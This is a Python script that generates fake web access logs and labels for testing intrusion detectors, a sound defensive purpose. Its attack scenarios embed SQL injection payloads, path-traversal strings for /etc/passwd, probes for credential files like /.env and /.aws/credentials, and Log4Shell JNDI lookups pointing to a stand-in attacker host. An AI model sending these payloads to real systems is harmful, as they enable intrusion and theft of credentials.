"""Synthetic web-access-log generator for testing WATCHTOWER detectors.

THIS PRODUCES FAKE DATA. Every line, client and "attack" below is invented so
that detectors can be measured against a known ground truth. The script only
writes text to local files; it never opens a network connection and never
contacts any host named in the log text. All IP addresses come from the RFC
5737 documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24),
which are reserved and never routed on the real internet.

Why it exists: a detector is only trustworthy if you know what it should find.
Benign traffic dominates (about 85-90% of lines), because real logs are mostly
boring and a detector that flags the boring majority is useless. Malicious
scenarios use textbook signatures from published detection rules, and one
"noisy but benign" user is a false-positive trap: dead links that look a bit
like enumeration but stay well below the 20-per-60s threshold.

Usage:
    python tools/generate_logs.py --out examples/sample_access.log \
        --labels examples/sample_labels.csv --seed 7 --hours 6
"""

from __future__ import annotations

import argparse
import csv
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

DEFAULT_START = datetime(2026, 11, 1, tzinfo=timezone.utc)
MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]
SITE = "https://shop.example.com"
BLOG_SLUGS = ["hello-world", "spring-sale", "shipping-faq", "care-guide", "new-arrivals", "team-story"]
SEARCH_TERMS = ["shoes", "jacket", "gift", "sale", "size+guide", "returns", "red+scarf"]
ASSETS = ["/static/site.css", "/static/app.js", "/static/logo.png", "/static/hero.png"]
DEAD_LINKS = ["/old-promo", "/products/9999", "/blog/retired-post", "/press-kit", "/static/old.css",
              "/faq.html", "/contact-us", "/sitemap-old.xml"]

SENSITIVE_PROBES = ["/.env", "/.git/config", "/wp-config.php.bak", "/phpinfo.php", "/server-status",
                    "/.aws/credentials", "/backup.sql", "/admin/", "/config.php.old", "/.htpasswd",
                    "/cgi-bin/test.cgi", "/wp-login.php", "/phpmyadmin/", "/info.php"]
SQLI_PAYLOADS = ["1' OR '1'='1", "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL,NULL--",
                 "1; SELECT SLEEP(5)--", "1' AND SLEEP(5)-- -", "1' OR 1=1--", "1 AND 1=CONVERT(int,@@version)",
                 "' UNION SELECT username,password FROM users--"]
TRAVERSAL_PATHS = ["/download?file=../../../../etc/passwd",
                   "/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd",
                   "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                   "/download?file=....//....//....//etc/passwd",
                   "/view?page=..\\..\\..\\windows\\win.ini",
                   "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                   "/static/..%2f..%2f..%2fetc/passwd"]
WORDLIST = ["admin", "backup", "test", "old", "dev", "staging", "uploads", "images2", "private", "tmp",
            "db", "api-v1", "secret", "portal", "cms", "files", "logs", "data", "web", "site"]


def fmt_time(ts: datetime) -> str:
    return f"{ts.day:02d}/{MONTHS[ts.month - 1]}/{ts.year}:{ts:%H:%M:%S} +0000"


def line(ts, ip, method, target, status, size, ref, ua) -> str:
    return f'{ip} - - [{fmt_time(ts)}] "{method} {target} HTTP/1.1" {status} {size} "{ref or "-"}" "{ua}"'


class _Log:
    """Collects (timestamp, line) pairs for one run."""

    def __init__(self, rng, start, span):
        self.rng, self.start, self.span = rng, start, span
        self.rows: list[tuple[datetime, str]] = []
        self.labels: list[dict] = []

    def add(self, ts, ip, method, target, status, size=None, ref="-", ua=""):
        if ts >= self.start + timedelta(seconds=self.span):
            return
        if size is None:
            size = self.rng.randint(200, 24000) if status == 200 else (0 if status == 304 else self.rng.randint(150, 600))
        self.rows.append((ts, line(ts, ip, method, target, status, size, ref, ua)))

    def label(self, ip, label, scenario):
        self.labels.append({"client_ip": ip, "label": label, "scenario": scenario})

    def at(self, frac_lo, frac_hi, room=0):
        """Random start second inside a fraction of the run, leaving `room` seconds before the end."""
        hi = max(1, int(self.span * frac_hi) - room)
        lo = min(int(self.span * frac_lo), hi - 1) if hi > 1 else 0
        return self.start + timedelta(seconds=self.rng.randint(max(lo, 0), hi))


def _page(rng):
    r = rng.random()
    if r < 0.2:
        return "/"
    if r < 0.3:
        return "/about"
    if r < 0.55:
        return f"/products/{rng.randint(1, 60)}"
    if r < 0.7:
        return f"/blog/{rng.choice(BLOG_SLUGS)}"
    if r < 0.85:
        return f"/search?q={rng.choice(SEARCH_TERMS)}"
    return "/login"


def _benign_user(log, ip, ua, sessions):
    rng = log.rng
    for _ in range(sessions):
        ts = log.at(0, 1, room=300)
        ref = rng.choice(["-", "https://www.google.com/", "https://duckduckgo.com/", SITE + "/"])
        for _ in range(rng.randint(2, 6)):
            page = _page(rng)
            status = 404 if rng.random() < 0.01 else rng.choice([200, 200, 200, 304])
            log.add(ts, ip, "GET", page, status, ref=ref, ua=ua)
            if page == "/login" and rng.random() < 0.4:
                ts += timedelta(seconds=rng.randint(5, 20))
                log.add(ts, ip, "POST", "/login", 302, 0, ref=SITE + "/login", ua=ua)
            for asset in rng.sample(ASSETS, rng.randint(0, 3)):
                ts += timedelta(seconds=rng.choice([0, 1]))
                log.add(ts, ip, "GET", asset, rng.choice([200, 304]), ref=SITE + page, ua=ua)
            ref = SITE + page
            ts += timedelta(seconds=rng.randint(4, 90))


def _benign(log, hours):
    rng = log.rng
    users = max(10, int(hours * 5))
    for i in range(users):
        ip = f"192.0.2.{10 + i}" if i < 200 else f"198.51.100.{i - 100}"
        _benign_user(log, ip, rng.choice(BROWSER_UAS), rng.randint(1, 3))
        log.label(ip, "benign", "benign_browsing")
    # noisy-but-benign: normal browsing plus ~8 dead links over ~10 minutes
    ip, ua = "192.0.2.250", BROWSER_UAS[0]
    _benign_user(log, ip, ua, 2)
    ts = log.at(0.2, 0.6, room=700)
    for dead in DEAD_LINKS:
        log.add(ts, ip, "GET", dead, 404, ref=SITE + "/", ua=ua)
        ts += timedelta(seconds=rng.randint(60, 90))
        log.add(ts - timedelta(seconds=30), ip, "GET", _page(rng), 200, ref=SITE + "/", ua=ua)
    log.label(ip, "benign", "noisy_benign")
    # polite crawler: one request every 3-6 seconds, in 20-minute crawl windows
    ip, ua = "198.51.100.10", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    for _ in range(max(1, int(hours / 3))):
        ts = log.at(0, 1, room=1300)
        end = ts + timedelta(minutes=20)
        while ts < end:
            page = rng.choice(["/", "/about", f"/products/{rng.randint(1, 60)}", f"/blog/{rng.choice(BLOG_SLUGS)}", "/robots.txt"])
            log.add(ts, ip, "GET", page, rng.choice([200, 200, 304]), ua=ua)
            ts += timedelta(seconds=rng.randint(3, 6))
    log.label(ip, "benign", "search_crawler")
    # health check every 30 s
    ip, ua = "198.51.100.20", "UptimeMonitor/1.0"
    ts = log.start
    while ts < log.start + timedelta(seconds=log.span):
        log.add(ts, ip, "GET", "/health", 200, 15, ua=ua)
        ts += timedelta(seconds=30)
    log.label(ip, "benign", "health_check")


def _scanner(log):
    rng, ip, ua = log.rng, "203.0.113.11", "Mozilla/5.0 (compatible; Nikto/2.5.0)"
    ts = log.at(0.1, 0.6, room=400)
    for path in rng.sample(SENSITIVE_PROBES, len(SENSITIVE_PROBES)):
        log.add(ts, ip, "GET", path, rng.choice([404, 404, 404, 403]), ua=ua)
        ts += timedelta(seconds=rng.randint(1, 4))
    for _ in range(70):
        log.add(ts, ip, "GET", f"/{rng.choice(WORDLIST)}/{rng.choice(WORDLIST)}.php", 404, ua=ua)
        ts += timedelta(seconds=rng.randint(2, 12))
    log.label(ip, "malicious", "scanner")


def _enumeration(log):
    rng, ip, ua = log.rng, "203.0.113.12", "gobuster/3.6"
    ts = log.at(0.1, 0.7, room=120)
    for word in rng.sample(WORDLIST, len(WORDLIST)) + [f"{w}{n}" for n in (2, 3, 4) for w in WORDLIST]:
        log.add(ts, ip, "GET", f"/{word}", 404, 0, ua=ua)
        ts += timedelta(seconds=rng.choice([0, 1, 1, 2]))
    log.label(ip, "malicious", "enumeration")


def _bruteforce(log):
    rng, ip = log.rng, "203.0.113.13"
    ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    ts = log.at(0.1, 0.7, room=400)
    for _ in range(40):
        log.add(ts, ip, "POST", "/login", 401, 512, ref=SITE + "/login", ua=ua)
        ts += timedelta(seconds=rng.randint(3, 8))
    log.add(ts, ip, "POST", "/login", 302, 0, ref=SITE + "/login", ua=ua)
    log.add(ts + timedelta(seconds=1), ip, "GET", "/account", 200, ref=SITE + "/login", ua=ua)
    log.label(ip, "malicious", "bruteforce")


def _sqli(log):
    rng, ip, ua = log.rng, "203.0.113.14", "sqlmap/1.8#stable (https://sqlmap.org)"
    ts = log.at(0.1, 0.7, room=200)
    for payload in SQLI_PAYLOADS * 5:
        enc = payload.replace(" ", "+")
        log.add(ts, ip, "GET", f"/products?id={enc}", rng.choice([200, 500, 500]), ua=ua)
        ts += timedelta(seconds=rng.randint(1, 5))
    log.label(ip, "malicious", "sqli")


def _log4shell(log):
    ip = "203.0.113.15"
    ua = "${jndi:ldap://203.0.113.99/a}"
    ts = log.at(0.1, 0.8, room=60)
    log.add(ts, ip, "GET", "/", 200, ua=ua)
    log.add(ts + timedelta(seconds=3), ip, "GET", "/login", 200, ref="${jndi:ldap://203.0.113.99/b}", ua=ua)
    log.add(ts + timedelta(seconds=7), ip, "GET", "/search?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.99%2Fc%7D", 200, ua="curl/8.5.0")
    log.label(ip, "malicious", "log4shell")


def _traversal(log):
    rng, ip, ua = log.rng, "203.0.113.16", "python-requests/2.31.0"
    ts = log.at(0.1, 0.8, room=120)
    for path in TRAVERSAL_PATHS:
        log.add(ts, ip, "GET", path, rng.choice([400, 403, 404]), ua=ua)
        ts += timedelta(seconds=rng.randint(2, 10))
    log.label(ip, "malicious", "traversal")


def generate(seed: int, hours: float, start: datetime | None = None) -> tuple[list[str], list[dict]]:
    """Return (log lines sorted by time, label rows). Same seed -> same output."""
    rng = random.Random(seed)
    start = start or DEFAULT_START
    if start.tzinfo is None:
        start = start.replace(tzinfo=timezone.utc)
    start = start.astimezone(timezone.utc)
    span = max(60, int(hours * 3600))
    log = _Log(rng, start, span)
    _benign(log, hours)
    for scenario in (_scanner, _enumeration, _bruteforce, _sqli, _log4shell, _traversal):
        scenario(log)
    log.rows.sort(key=lambda r: r[0])   # stable: ties keep generation order
    return [text for _, text in log.rows], log.labels


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Generate FAKE access logs for detector testing (local files only).")
    ap.add_argument("--out", required=True)
    ap.add_argument("--labels", required=True)
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--hours", type=float, default=6.0)
    ap.add_argument("--start", default=None, help="ISO 8601 start time, default 2026-11-01T00:00:00Z")
    args = ap.parse_args(argv)
    start = datetime.fromisoformat(args.start.replace("Z", "+00:00")) if args.start else None
    lines, labels = generate(args.seed, args.hours, start)
    Path(args.out).parent.mkdir(parents=True, exist_ok=True)
    Path(args.out).write_text("\n".join(lines) + "\n", encoding="utf-8")
    with open(args.labels, "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=["client_ip", "label", "scenario"])
        w.writeheader()
        w.writerows(labels)
    print(f"wrote {len(lines)} lines to {args.out} and {len(labels)} labels to {args.labels}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
